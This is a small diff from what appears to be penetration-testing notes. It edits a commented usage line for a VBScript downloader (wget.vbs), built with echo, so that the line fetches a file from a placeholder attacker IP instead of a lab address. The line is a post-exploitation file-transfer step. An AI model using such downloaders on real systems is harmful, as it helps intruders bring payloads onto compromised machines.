@@ -28,4 +28,4 @@ echo ts.Close >> wget.vbs
 
 
 #After you've created wget.vbs
-#cscript wget.vbs http://10.11.0.138/test.txt test.txt
+#cscript wget.vbs http://YO.UR.IP.ADD/test.txt test.txt
